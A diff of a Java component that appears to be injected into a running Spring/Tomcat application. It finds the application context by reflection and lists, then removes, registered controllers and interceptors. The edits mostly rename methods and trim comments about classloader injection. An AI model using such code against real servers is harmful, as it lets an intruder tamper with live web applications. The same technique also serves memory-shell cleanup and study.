@@ -9,8 +9,7 @@ public class SpringFrameworkManageComponent implements Runnable {
 
     private HashMap params;
     private HashMap results;
-    // 注意：曾经这里有 `private static Object context` 缓存，第一次 idle 拿不到就永远空。
-    // 现在每次 invoke 都重新解析。
+
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
@@ -38,33 +37,33 @@ public class SpringFrameworkManageComponent implements Runnable {
         }
         String methodName = (String) methodObj;
         if (!"getFrameworkInfo".equals(methodName)
-                && !"unLoadController".equals(methodName)
-                && !"unLoadInterceptor".equals(methodName)) {
+                && !"removeController".equals(methodName)
+                && !"removeInterceptor".equals(methodName)) {
             results.put("code", Integer.valueOf(400));
             results.put("msg", "未知 methodName: " + methodName);
             return;
         }
-        // 每次现取，不缓存，避免首次 idle 失败或 context 刷新后保留旧引用。
         context = getContext();
         if ("getFrameworkInfo".equals(methodName)) {
             results.put("frameworkInfo",getFrameworkInfo());
             results.put("code", Integer.valueOf(200));
             return;
-        } else if ("unLoadController".equals(methodName)) {
+        } else if ("removeController".equals(methodName)) {
             String mappingInfo= (String) params.get("mappingInfo");
-            putOperationResult(unLoadController(mappingInfo));
-        } else if ("unLoadInterceptor".equals(methodName)) {
+            putOperationResult(removeController(mappingInfo));
+        } else if ("removeInterceptor".equals(methodName)) {
             String interceptorId= (String) params.get("interceptorId");
-            putOperationResult(unLoadInterceptor(interceptorId));
+            putOperationResult(removeInterceptor(interceptorId));
         }
     }
 
     private void putOperationResult(Boolean changed) {
-        boolean removed = Boolean.TRUE.equals(changed);
-        results.put("removed", Boolean.valueOf(removed));
+        boolean changedValue = Boolean.TRUE.equals(changed);
+        results.put("matched", Integer.valueOf(changedValue ? 1 : 0));
+        results.put("changed", Integer.valueOf(changedValue ? 1 : 0));
         results.put("verified", Boolean.TRUE);
-        results.put("status", removed ? "CHANGED" : "NOT_FOUND");
-        results.put("code", Integer.valueOf(removed ? 200 : 404));
+        results.put("status", changedValue ? "CHANGED" : "NOT_FOUND");
+        results.put("code", Integer.valueOf(changedValue ? 200 : 404));
     }
 
 
@@ -108,7 +107,7 @@ public class SpringFrameworkManageComponent implements Runnable {
     }
 
 
-    public Boolean unLoadController(String mappingInfo) throws Exception {
+    public Boolean removeController(String mappingInfo) throws Exception {
         if (context == null) return Boolean.FALSE;
         Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
 
@@ -183,7 +182,7 @@ public class SpringFrameworkManageComponent implements Runnable {
         }
         return AllMappedInterceptor;
     }
-    public Boolean unLoadInterceptor(String interceptorId) throws Exception {
+    public Boolean removeInterceptor(String interceptorId) throws Exception {
         if (context == null) return Boolean.FALSE;
         boolean removed = false;
         Map handlerMappings= (Map) invokeMethod(context, "getBeansOfType", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.HandlerMapping",false,Thread.currentThread().getContextClassLoader())});
@@ -227,8 +226,7 @@ public class SpringFrameworkManageComponent implements Runnable {
         } catch (Exception ignored) {
         }
 
-        // 路径 1：从当前请求线程绑定的 RequestAttributes 直接拿 ServletContext
-        // 只在请求线程里有效（puppet 在请求线程上执行时才走得通），idle 时返回 null
+        // 路径 1：从当前请求线程绑定的 RequestAttributes 获取 ServletContext。
         if (context == null) try {
             Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
             Object httprequest = invokeMethod(requestAttributes, "getRequest");
@@ -239,8 +237,7 @@ public class SpringFrameworkManageComponent implements Runnable {
         } catch (Exception e) {
         }
 
-        // 路径 2（Spring 5.x）：LiveBeansView.applicationContexts
-        // Spring 5.3 起 @Deprecated，6+ 移除；保留作为老版本兜底
+        // 路径 2：Spring 5.2 及更早版本的 LiveBeansView。
         if (context == null) {
             try {
                 LinkedHashSet applicationContexts = (LinkedHashSet) getFV(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
@@ -268,8 +265,7 @@ public class SpringFrameworkManageComponent implements Runnable {
             }
         }
 
-        // 路径 4：从 Tomcat StandardContext 反推 ServletContext → WebApplicationContext
-        // 解决 idle Tomcat + 全局 CL 注入场景（路径 1/2 都失效时的最终兜底）
+        // 路径 4：从 Tomcat StandardContext 获取 WebApplicationContext。
         if (context == null) {
             try {
                 context = getContextFromTomcat(classLoader);
